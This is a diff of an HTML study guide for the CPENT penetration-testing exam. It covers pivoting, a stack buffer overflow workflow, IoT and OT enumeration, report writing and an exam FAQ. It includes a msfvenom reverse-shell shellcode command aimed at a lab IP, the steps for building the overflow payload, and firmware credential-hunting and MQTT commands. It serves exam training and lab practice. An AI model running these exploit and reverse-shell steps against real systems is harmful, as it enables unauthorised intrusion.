-  <div class="note n-crit"><div class="note-icon">🔗</div><div class="note-body"><div class="note-title">The double pivot, in one sentence</div><p>Compromise host A (reachable), tunnel through it to reach host B on a second network, compromise B, then start a <em>second</em> tunnel through B to reach network C. ligolo-ng handles this cleanly by adding a route per segment; with SSH you nest a second <code>-D</code> through the first proxy. Metasploit does it with <code>autoroute</code> + a second <code>socks_proxy</code>. See the deeper <a class="inl" href="/pivoting.html">pivoting &amp; tunnelling lab</a>.</p></div></div>
-</div>
+  <div class="callout key">
+    <div class="cl-label">The double pivot, in one sentence</div>
+    <p>Compromise host A (reachable), tunnel through it to reach host B on a second network, compromise B, then start a second tunnel through B to reach network C. ligolo-ng handles this cleanly by adding a route per segment; with SSH you nest a second <code>-D</code> through the first proxy; Metasploit does it with <code>autoroute</code> plus a second <code>socks_proxy</code>. See the full <a class="inl" href="/pivoting.html">pivoting &amp; tunnelling lab</a>.</p>
+  </div>
+</section>
 
-<!-- 11 BINARIES -->
-<div class="sec" id="s11">
-  <div class="sec-eyebrow">Section 11 · Module 11</div>
-  <h2 class="sec-title"><span class="sec-num">11</span> Reverse engineering &amp; binary exploitation</h2>
-  <div class="sec-divider"></div>
-  <p>The module that scares people. You are not asked to write research-grade exploits. You are asked to drive the <strong>classic stack buffer overflow</strong> to completion, on both 32 and 64-bit targets, under time pressure. Know the workflow as a reflex.</p>
-  <div class="cb">
-    <div class="cb-top"><span class="cb-lang"><span class="dot d-note"></span>the stack overflow workflow</span><button class="cp-btn" onclick="cp(this)">📋 Copy</button></div>
+<!-- 11 -->
+<section class="sec" id="s11">
+  <div class="sec-h"><span class="n">11</span><h2>Reverse engineering &amp; binary exploitation</h2></div>
+  <p>The module that scares people. You are not asked to write research-grade exploits. You are asked to drive the classic <strong>stack buffer overflow</strong> to completion, on both 32 and 64-bit targets, under time pressure. Know the workflow as a reflex.</p>
+  <div class="code">
+    <div class="code-top"><span class="code-label">the stack overflow workflow</span><button class="copy" onclick="cp(this)">Copy</button></div>
 <pre><span class="cm"># 0. Triage the binary</span>
 checksec --file=./vuln          <span class="cm"># NX? PIE? canary? RELRO?</span>
 
-<span class="cm"># 1. Crash it, then find the exact offset to EIP/RIP</span>
+<span class="cm"># 1. Crash it, then find the exact offset to EIP / RIP</span>
 msf-pattern_create -l 2000
 msf-pattern_offset -q 39694438  <span class="cm"># the value that landed in EIP</span>
 
-<span class="cm"># 2. Confirm control: send offset*'A' + 'BBBB' -&gt; EIP=0x42424242</span>
+<span class="cm"># 2. Confirm control: offset*'A' + 'BBBB' -&gt; EIP = 0x42424242</span>
 <span class="cm"># 3. Find bad chars (compare sent vs memory), then a JMP ESP</span>
-!mona jmp -r esp -cpb '\x00\x0a'   <span class="cm"># in Immunity/WinDbg + mona.py</span>
+!mona jmp -r esp -cpb '\x00\x0a'   <span class="cm"># Immunity / WinDbg + mona.py</span>
 
-<span class="cm"># 4. Generate shellcode avoiding bad chars</span>
+<span class="cm"># 4. Generate shellcode avoiding the bad chars</span>
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 \
          -b '\x00\x0a\x0d' -f python -v shellcode
 
-<span class="cm"># 5. Payload = offset*'A' + JMP_ESP_addr + NOPs + shellcode</span>
-</pre>
+<span class="cm"># 5. Payload = offset*'A' + JMP_ESP_addr + NOPs + shellcode</span></pre>
   </div>
   <div class="tbl-wrap"><table>
-    <tr><th>Protection</th><th>What it stops</th><th>Range-realistic answer</th></tr>
+    <thead><tr><th>Protection</th><th>What it stops</th><th>Range-realistic answer</th></tr></thead>
+    <tbody>
     <tr><td>NX / DEP</td><td>Executing shellcode on the stack</td><td>Ret2libc or a short ROP chain to <code>system()</code></td></tr>
     <tr><td>ASLR</td><td>Hardcoding addresses</td><td>Leak an address first, or brute a non-PIE 32-bit base</td></tr>
     <tr><td>Stack canary</td><td>Overwriting the return address blindly</td><td>Leak the canary via a format string, then keep it intact</td></tr>
+    </tbody>
   </table></div>
-  <div class="note n-ok"><div class="note-icon">🛠️</div><div class="note-body"><div class="note-title">Tooling</div><p><strong>gdb + pwndbg</strong> or <strong>GEF</strong> for dynamic analysis, <strong>Ghidra</strong> for static reversing, <strong>mona.py</strong> in Immunity/WinDbg for Windows offset and gadget hunting. For scripted exploits, <code>pwntools</code> turns the five steps above into a dozen lines of Python.</p></div></div>
-</div>
+  <p>Tooling: <strong>gdb</strong> with pwndbg or GEF for dynamic analysis, <strong>Ghidra</strong> for static reversing, <strong>mona.py</strong> in Immunity or WinDbg for offset and gadget hunting. For scripted exploits, <code>pwntools</code> turns the five steps above into a dozen lines of Python.</p>
+</section>
 
-<!-- 12 IOT/OT -->
-<div class="sec" id="s12">
-  <div class="sec-eyebrow">Section 12 · Module 13 + advanced range</div>
-  <h2 class="sec-title"><span class="sec-num">12</span> IoT &amp; OT / SCADA</h2>
-  <div class="sec-divider"></div>
+<!-- 12 -->
+<section class="sec" id="s12">
+  <div class="sec-h"><span class="n">12</span><h2>IoT &amp; OT / SCADA</h2></div>
   <p>IoT is a named module; operational technology is an advanced range skill. Both reward careful enumeration over brute force, and OT especially demands a light touch: these are systems that move physical things.</p>
-  <div class="cb">
-    <div class="cb-top"><span class="cb-lang"><span class="dot d-kali"></span>firmware &amp; IoT protocols</span><button class="cp-btn" onclick="cp(this)">📋 Copy</button></div>
+  <div class="code">
+    <div class="code-top"><span class="code-label">firmware &amp; IoT protocols</span><button class="copy" onclick="cp(this)">Copy</button></div>
 <pre><span class="cm"># Firmware: extract and hunt for secrets</span>
 binwalk -e firmware.bin                 <span class="cm"># carve the filesystem</span>
 strings -n 8 firmware.bin | grep -i -E 'pass|key|token'
@@ -725,127 +677,89 @@ grep -rE '(BEGIN RSA|admin:)' _firmware.extracted/
 
 <span class="cm"># MQTT (1883) — often unauthenticated on IoT</span>
 mosquitto_sub -h 10.10.10.5 -t '#' -v   <span class="cm"># subscribe to everything</span>
-</pre>
-  </div>
-  <div class="cb">
-    <div class="cb-top"><span class="cb-lang"><span class="dot d-note"></span>OT / SCADA — enumerate, do not disrupt</span><button class="cp-btn" onclick="cp(this)">📋 Copy</button></div>
-<pre><span class="cm"># Modbus (502) and S7comm (102) — identify only</span>
+
+<span class="cm"># OT / SCADA — identify only, do not disrupt</span>
 nmap -p 502 --script modbus-discover 10.10.10.5
-nmap -p 102 --script s7-info 10.10.10.5
-</pre>
+nmap -p 102 --script s7-info 10.10.10.5</pre>
   </div>
-  <div class="note n-crit"><div class="note-icon">🏭</div><div class="note-body"><div class="note-title">OT safety mindset</div><p>On operational technology you enumerate and prove access; you do not fuzz or flood. In the real world an aggressive scan can halt a PLC and a physical process. CPENT tests whether you know the difference between a controlled test and a reckless one, so treat OT targets as read-first, write-never unless the objective explicitly calls for it.</p></div></div>
-</div>
+  <div class="callout key">
+    <div class="cl-label">OT safety mindset</div>
+    <p>On operational technology you enumerate and prove access; you do not fuzz or flood. In the real world an aggressive scan can halt a PLC and a physical process. CPENT tests whether you know the difference between a controlled test and a reckless one, so treat OT targets as read-first, write-never unless the objective explicitly calls for it.</p>
+  </div>
+</section>
 
-<div class="part-label">Part IV · Finishing the exam</div>
+<p class="part">Part IV &mdash; Finishing the exam</p>
 
-<!-- 13 REPORT -->
-<div class="sec" id="s13">
-  <div class="sec-eyebrow">Section 13 · Module 14</div>
-  <h2 class="sec-title"><span class="sec-num">13</span> Report writing &amp; submission</h2>
-  <div class="sec-divider"></div>
-  <p>The exam is not over when the range closes. You have <strong>seven days</strong> to submit a professional penetration test report, and it counts toward your score. Treat it as a deliverable a client would pay for, because in the LPT world, that is exactly the point.</p>
+<!-- 13 -->
+<section class="sec" id="s13">
+  <div class="sec-h"><span class="n">13</span><h2>Report writing &amp; submission</h2></div>
+  <p>The exam is not over when the range closes. You have <strong>seven days</strong> to submit a professional penetration test report, and it counts toward your score. Treat it as a deliverable a client would pay for, because in the LPT world that is exactly the point.</p>
   <div class="tbl-wrap"><table>
-    <tr><th>Section</th><th>What graders look for</th></tr>
-    <tr><td><b>Executive summary</b></td><td>Business-language risk, no jargon. What could an attacker do, and why should leadership care.</td></tr>
-    <tr><td><b>Scope &amp; methodology</b></td><td>What was in scope, the standard followed, dates and rules of engagement.</td></tr>
-    <tr><td><b>Findings</b></td><td>One per issue: title, CVSS/severity, affected asset, description, and <b>reproducible</b> steps.</td></tr>
-    <tr><td><b>Proof of concept</b></td><td>Screenshots with the command visible, request/response pairs, the captured flag.</td></tr>
-    <tr><td><b>Remediation</b></td><td>Specific, actionable fixes per finding. Not "patch everything".</td></tr>
+    <thead><tr><th>Section</th><th>What graders look for</th></tr></thead>
+    <tbody>
+    <tr><td>Executive summary</td><td>Business-language risk, no jargon. What could an attacker do, and why should leadership care.</td></tr>
+    <tr><td>Scope &amp; methodology</td><td>What was in scope, the standard followed, dates and rules of engagement.</td></tr>
+    <tr><td>Findings</td><td>One per issue: title, CVSS / severity, affected asset, description, and reproducible steps.</td></tr>
+    <tr><td>Proof of concept</td><td>Screenshots with the command visible, request / response pairs, the captured flag.</td></tr>
+    <tr><td>Remediation</td><td>Specific, actionable fixes per finding. Not &ldquo;patch everything&rdquo;.</td></tr>
+    </tbody>
   </table></div>
-  <div class="note n-warn"><div class="note-icon">📸</div><div class="note-body"><div class="note-title">Evidence you cannot fake later</div><p>Every screenshot should show the target IP, your command and the result in one frame. A flag string with no context is weak proof. This is why the <a class="inl" href="#s4">time plan</a> ends each session with an evidence-lock window: reconstructing proofs from memory after the range closes is where scores quietly leak away.</p></div></div>
-</div>
+  <p>Every screenshot should show the target IP, your command and the result in one frame. A flag string with no context is weak proof. This is why the <a class="inl" href="#s4">time plan</a> ends each session with an evidence-lock window: reconstructing proofs from memory after the range closes is where scores quietly leak away.</p>
+</section>
 
-<!-- 14 FAQ -->
-<div class="sec faq" id="s14">
-  <div class="sec-eyebrow">Section 14</div>
-  <h2 class="sec-title"><span class="sec-num">14</span> CPENT exam FAQ</h2>
-  <div class="sec-divider"></div>
-  <div class="faq-item">
-    <h3>How long is the CPENT exam and how is it scored?</h3>
-    <p>It is a fully practical exam on a live cyber range. You choose one continuous 24-hour session or two 12-hour sessions. Score <strong>70%+</strong> for the CPENT certification and <strong>90%+</strong> to also earn the Licensed Penetration Tester (LPT) Master credential. You then submit a professional report within seven days of your final session, and that report is scored too.</p>
-  </div>
-  <div class="faq-item">
-    <h3>Is the CPENT exam open book?</h3>
-    <p>Yes. It is a hands-on range, so your own notes, cheat sheets and standard tools are allowed; outside help is not. The advantage of a reference like this is speed. On a 24-hour clock, the tester who does not stop to look up an <code>msfvenom</code> flag or a Kerberoasting one-liner simply finishes more challenges.</p>
-  </div>
-  <div class="faq-item">
-    <h3>What is CPENT AI and how is it different from the older CPENT?</h3>
-    <p>CPENT AI is the current version. It keeps the same 24-hour practical exam and LPT Master pathway, and layers in AI-assisted techniques across the phases: AI for reconnaissance, vulnerability analysis, exploit suggestion and Active Directory enumeration. The core skills the range grades are unchanged.</p>
-  </div>
-  <div class="faq-item">
-    <h3>What is the hardest part of the CPENT exam?</h3>
-    <p>For most candidates it is pivoting into hidden segments combined with binary exploitation under time pressure. The range is chained, so a foothold on one host is the only route to a network behind it, and a failed pivot blocks everything past it. Practising double pivoting and 32 and 64-bit stack overflows until they are automatic is what separates a pass from an LPT Master score.</p>
-  </div>
-  <div class="faq-item">
-    <h3>What is Hackers 4 Humanity and how does it relate to CPENT?</h3>
-    <p>It is an EC-Council initiative offering experienced pen testers a fully sponsored CPENT AI exam. For each professional who passes, EC-Council donates $1,000 of cybersecurity training to underprivileged learners through non-profit partners. Score 90%+ and you are recognised as one of the 1,000 Great Pen Testers of 2026 at Hacker Halted. Nominations run from May to early October 2026.</p>
-  </div>
-  <div class="faq-item">
-    <h3>Do I need exploit development skills to pass CPENT?</h3>
-    <p>You need working competence, not research-grade skill. The binary module expects you to find a stack buffer overflow, calculate the offset, handle bad characters, redirect execution to a <code>JMP ESP</code> and land a msfvenom payload, on both 32 and 64-bit targets. You will not be asked to write a novel heap exploit, but the classic stack overflow workflow must be second nature.</p>
-  </div>
-</div>
+<!-- 14 -->
+<section class="sec" id="s14">
+  <div class="sec-h"><span class="n">14</span><h2>CPENT exam FAQ</h2></div>
+  <h3>How long is the CPENT exam and how is it scored?</h3>
+  <p>It is a fully practical exam on a live cyber range. You choose one continuous 24-hour session or two 12-hour sessions. Score <strong>70%+</strong> for the CPENT certification and <strong>90%+</strong> to also earn the Licensed Penetration Tester (LPT) Master credential. You then submit a professional report within seven days of your final session, and that report is scored too.</p>
+  <h3>Is the CPENT exam open book?</h3>
+  <p>Yes. It is a hands-on range, so your own notes, cheat sheets and standard tools are allowed; outside help is not. The advantage of a reference like this is speed. On a 24-hour clock, the tester who does not stop to look up an <code>msfvenom</code> flag or a Kerberoasting one-liner simply finishes more challenges.</p>
+  <h3>What is CPENT AI, and how is it different from the older CPENT?</h3>
+  <p>CPENT AI is the current version. It keeps the same 24-hour practical exam and LPT Master pathway, and layers in AI-assisted techniques across the phases: AI for reconnaissance, vulnerability analysis, exploit suggestion and Active Directory enumeration. The core skills the range grades are unchanged.</p>
+  <h3>What is the hardest part of the CPENT exam?</h3>
+  <p>For most candidates it is pivoting into hidden segments combined with binary exploitation under time pressure. The range is chained, so a foothold on one host is the only route to a network behind it, and a failed pivot blocks everything past it. Practising double pivoting and 32 and 64-bit stack overflows until they are automatic is what separates a pass from an LPT Master score.</p>
+  <h3>What is Hackers 4 Humanity, and how does it relate to CPENT?</h3>
+  <p>It is an EC-Council initiative offering experienced pen testers a fully sponsored CPENT AI exam. For each professional who passes, EC-Council donates $1,000 of cybersecurity training to underprivileged learners through non-profit partners. Score 90%+ and you are recognised as one of the 1,000 Great Pen Testers of 2026 at Hacker Halted. Nominations run from May to early October 2026.</p>
+  <h3>Do I need exploit development skills to pass CPENT?</h3>
+  <p>You need working competence, not research-grade skill. The binary module expects you to find a stack buffer overflow, calculate the offset, handle bad characters, redirect execution to a <code>JMP ESP</code> and land a msfvenom payload, on both 32 and 64-bit targets. You will not be asked to write a novel heap exploit, but the classic stack overflow workflow must be second nature.</p>
+</section>
 
-</div><!-- end content -->
+<div id="coaching-cta-strip" data-lead="Preparing for CPENT with a job in mind?" data-tail="I mentor pentesters through exactly this ground, 1:1, from first Nmap to the report. Free intake call first." style="min-height:64px;margin:44px 0 0"></div>
 
-<nav class="sg-related" aria-label="Related pages">
-<style id="sg-related-css">
-.sg-related{max-width:900px;margin:56px auto 40px;padding:0 20px;box-sizing:border-box;font-family:Inter,-apple-system,'Segoe UI',sans-serif;line-height:1.5}
-.sg-related .sgr-box{background:#111418;border:1px solid #262b33;border-radius:16px;padding:24px 26px}
-.sg-related .sgr-title{font-size:12px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:#8b95a1;margin:0 0 14px}
-.sg-related ul{list-style:none;margin:0;padding:0;display:grid;gap:14px 18px;grid-template-columns:repeat(auto-fit,minmax(220px,1fr))}
-.sg-related li a{display:block;color:#e6e9ee;font-weight:600;font-size:16px;text-decoration:none}
-.sg-related li a:hover{color:#ff6b78}
-.sg-related li span{display:block;color:#9aa3ad;font-size:14px;margin-top:2px}
-.sg-related .sgr-foot{margin:18px 0 0;padding-top:14px;border-top:1px solid #262b33;font-size:14px;color:#9aa3ad}
-.sg-related .sgr-foot a{color:#ff6b78;font-weight:600;text-decoration:none}
-.sg-related .sgr-foot a:hover{text-decoration:underline}
-html.light .sg-related .sgr-box{background:#f6f7f9;border-color:#d9dde3}
-html.light .sg-related .sgr-title{color:#5b6572}
-html.light .sg-related li a{color:#14171b}
-html.light .sg-related li a:hover,html.light .sg-related .sgr-foot a{color:#c02233}
-html.light .sg-related li span,html.light .sg-related .sgr-foot{color:#4b5563}
-html.light .sg-related .sgr-foot{border-color:#d9dde3}
-</style>
-  <div class="sgr-box">
-    <p class="sgr-title">Go deeper</p>
-    <ul>
-      <li><a href="/pivoting.html">Pivoting &amp; tunnelling lab</a><span>The exam skill, worked end to end</span></li>
-      <li><a href="/offsec_medtech.html">Active Directory attack lab</a><span>SQLi to Domain Admin, a full chain</span></li>
-      <li><a href="/osint.html">OSINT guide, 2026 edition</a><span>Recon before you touch a port</span></li>
-      <li><a href="/shopeasy.html">API security lab</a><span>IDOR, BOLA and broken auth in practice</span></li>
-    </ul>
-    <p class="sgr-foot">Preparing for CPENT with a job in mind, not just the badge? <a href="/coaching/">1:1 mentorship</a> &middot; <a href="/start.html">Career roadmap</a> &middot; <a href="https://labs.sarathg.me/">All labs</a></p>
-  </div>
+<nav class="related" aria-label="Related pages">
+  <p class="rl-label">Go deeper</p>
+  <ul>
+    <li><a href="/pivoting.html">Pivoting &amp; tunnelling lab</a><span>The exam skill, worked end to end</span></li>
+    <li><a href="/offsec_medtech.html">Active Directory attack lab</a><span>SQLi to Domain Admin, a full chain</span></li>
+    <li><a href="/osint.html">OSINT guide, 2026 edition</a><span>Recon before you touch a port</span></li>
+    <li><a href="/shopeasy.html">API security lab</a><span>IDOR, BOLA and broken auth in practice</span></li>
+  </ul>
+  <p class="foot">Preparing for CPENT with a job in mind, not just the badge? <a href="/coaching/">1:1 mentorship</a> &middot; <a href="/start.html">Career roadmap</a> &middot; <a href="https://labs.sarathg.me/">All labs</a></p>
 </nav>
 
+</div><!-- /wrap -->
 </main>
+
 <script src="cta-coaching.js" defer></script>
 <script src="footer.js" defer></script>
 
 <script>
-function cp(btn) {
-  const pre = btn.closest('.cb').querySelector('pre');
-  navigator.clipboard.writeText(pre.innerText).then(() => {
-    btn.textContent = '✅ Copied'; btn.classList.add('ok');
-    setTimeout(() => { btn.textContent = '📋 Copy'; btn.classList.remove('ok'); }, 2000);
+function cp(btn){
+  var pre = btn.closest('.code').querySelector('pre');
+  navigator.clipboard.writeText(pre.innerText).then(function(){
+    btn.textContent = 'Copied'; btn.classList.add('ok');
+    setTimeout(function(){ btn.textContent = 'Copy'; btn.classList.remove('ok'); }, 1800);
   });
 }
-const secIds = ["s1","s2","s3","s4","s5","s6","s7","s8","s9","s10","s11","s12","s13","s14"];
-function gotoSec(btn, id) {
-  document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('on'));
-  btn.classList.add('on');
-  document.getElementById(id).scrollIntoView({ behavior: 'smooth', block: 'start' });
-}
-const _btns = document.querySelectorAll('.nav-btn');
-window.addEventListener('scroll', () => {
-  let cur = secIds[0];
-  secIds.forEach(id => { const el = document.getElementById(id); if (el && window.scrollY >= el.offsetTop - 90) cur = id; });
-  _btns.forEach((b, i) => b.classList.toggle('on', secIds[i] === cur));
-  const active = document.querySelector('.nav-btn.on');
+var ids = ["s1","s2","s3","s4","s5","s6","s7","s8","s9","s10","s11","s12","s13","s14"];
+var links = Array.prototype.slice.call(document.querySelectorAll('.toc a'));
+window.addEventListener('scroll', function(){
+  var cur = ids[0];
+  ids.forEach(function(id){ var el = document.getElementById(id); if (el && window.scrollY >= el.offsetTop - 130) cur = id; });
+  links.forEach(function(a){ a.classList.toggle('on', a.getAttribute('href') === '#' + cur); });
+  var active = document.querySelector('.toc a.on');
   if (active) active.scrollIntoView({ block:'nearest', inline:'nearest' });
-}, { passive: true });
+}, { passive:true });
 </script>
 </body>
 </html>
